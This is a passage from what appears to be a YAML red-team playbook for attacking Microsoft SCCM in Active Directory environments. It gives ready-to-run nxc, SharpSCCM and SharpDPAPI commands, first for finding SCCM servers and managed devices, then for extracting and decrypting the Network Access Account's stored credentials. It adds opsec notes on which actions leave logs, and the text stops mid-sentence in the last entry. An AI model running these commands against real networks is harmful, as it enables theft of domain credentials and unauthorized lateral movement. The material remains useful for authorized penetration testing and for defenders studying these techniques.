  - id: sccm_recon
    name: SCCM — Discovery and Infrastructure Mapping
    tab: Enumeration
    requires: [DC_IP, DOMAIN, USERNAME, PASSWORD]
    tags: [sccm, mecm, enum, discovery, ldap, nxc]
    description: >
      Find SCCM infrastructure in the environment. SCCM Management Points,
      Distribution Points, and Site Servers are high-value targets — they often
      run as SYSTEM with domain-wide reach, store credentials for managed hosts,
      and have access to all managed machines via client push.
    commands:
      - label: "Find SCCM Management Points via LDAP"
        cmd: "nxc ldap {DC_IP} -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} --query '(objectClass=mSSMSManagementPoint)' 'dNSHostName mSSMSSiteCode'"
      - label: "Find SCCM Site Servers"
        cmd: "nxc ldap {DC_IP} -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} --query '(objectClass=mSSMSSite)' 'mSSMSSiteCode mSSMSSiteName'"
      - label: "Find SCCM via DNS"
        cmd: "nslookup -type=SRV _mssms-mp._tcp.{DOMAIN} {DC_IP}"
      - label: "Find via SMB service enumeration"
        cmd: "nxc smb {SUBNET}/24 -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} -x 'sc query CcmExec 2>nul | findstr RUNNING' --continue-on-success"
      - label: "SharpSCCM — enumerate site info"
        cmd: "SharpSCCM.exe get site-info -sms {TARGET_IP}"
      - label: "SharpSCCM — find primary users"
        cmd: "SharpSCCM.exe get primary-users -sms {TARGET_IP} -sc {SITE_CODE}"
      - label: "SharpSCCM — list all managed devices"
        cmd: "SharpSCCM.exe get devices -sms {TARGET_IP} -sc {SITE_CODE}"
    opsec: >
      LDAP queries — low noise. SharpSCCM uses the SCCM admin console API
      which is legitimate admin traffic. SMB service check generates 4624.
    cleanup: []

  - id: sccm_naa_credentials
    name: SCCM — Network Access Account (NAA) Credential Extraction
    tab: Credential Attacks
    requires: [TARGET, USERNAME, PASSWORD, DOMAIN]
    requires_priv: local_admin
    tags: [sccm, naa, network-access-account, credentials, wmi, registry, cleartext]
    description: >
      The SCCM Network Access Account (NAA) is used by machines to access
      distribution points before domain join. The credentials are stored
      encrypted in WMI and registry on all SCCM clients. Decryptable with
      machine DPAPI key. Often a domain account with broad access.
    commands:
      - label: "Extract NAA via SharpSCCM"
        cmd: "SharpSCCM.exe get naa -sms {TARGET_IP} -sc {SITE_CODE}"
      - label: "Extract NAA via WMI (requires local admin)"
        cmd: "nxc smb {TARGET} -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} -X \"Get-WmiObject -Namespace 'ROOT\\ccm\\Policy\\Machine\\ActualConfig' -Class CCM_NetworkAccessAccount | Select-Object NetworkAccessUsername, NetworkAccessPassword\""
      - label: "Extract NAA via registry + DPAPI"
        cmd: "nxc smb {TARGET} -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} -M sccm"
      - label: "Extract via NMAAretrieved (on-target)"
        cmd: "nxc smb {TARGET} -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} -X \"[Convert]::FromBase64String((Get-WmiObject -Namespace root\\ccm\\policy\\machine\\actualconfig -Class CCM_NetworkAccessAccount).NetworkAccessPassword) | ForEach-Object { [System.Text.Encoding]::Unicode.GetString($_) }\""
      - label: "Alternative — SharpDPAPI to decrypt CCM cache"
        cmd: "SharpDPAPI.exe machinemasterkeys && SharpDPAPI.exe credentials"
    opsec: >
      WMI namespace access is logged in WMI operational logs. DPAPI decryption
